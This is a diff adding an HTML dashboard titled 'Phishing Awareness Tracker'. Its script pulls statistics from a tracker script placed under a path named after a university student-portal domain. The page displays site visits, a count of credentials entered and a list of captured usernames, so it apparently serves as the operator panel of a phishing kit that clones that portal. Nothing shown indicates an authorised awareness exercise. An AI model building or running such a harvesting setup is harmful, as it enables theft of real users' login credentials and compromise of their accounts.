@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phishing Awareness Tracker</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f4; margin: 0; padding: 0; }
+        .container { max-width: 600px; margin: 40px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
+        h1 { color: #08788F; }
+        .stats { margin: 20px 0; }
+        .user-list { background: #f9f9f9; padding: 10px; border-radius: 6px; }
+        .user-list li { margin: 5px 0; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Phishing Awareness Tracker</h1>
+        <div class="stats">
+            <p><strong>Total Visits:</strong> <span id="visitCount">0</span></p>
+            <p><strong>Credentials Entered:</strong> <span id="credCount">0</span></p>
+        </div>
+        <h2>Usernames Entered:</h2>
+        <ul class="user-list" id="usernames"></ul>
+    </div>
+    <script>
+        // Fetch stats from PHP backend using full path for server root at /home/killshot/Desktop/bit
+    fetch('/studentportal.bdu.edu.et/Account/tracker.php')
+            .then(response => response.json())
+            .then(data => {
+                document.getElementById('visitCount').textContent = data.visitCount;
+                document.getElementById('credCount').textContent = data.credCount;
+                const ul = document.getElementById('usernames');
+                ul.innerHTML = '';
+                data.usernames.forEach(u => {
+                    const li = document.createElement('li');
+                    li.textContent = u;
+                    ul.appendChild(li);
+                });
+            });
+    </script>
+</body>
+</html>
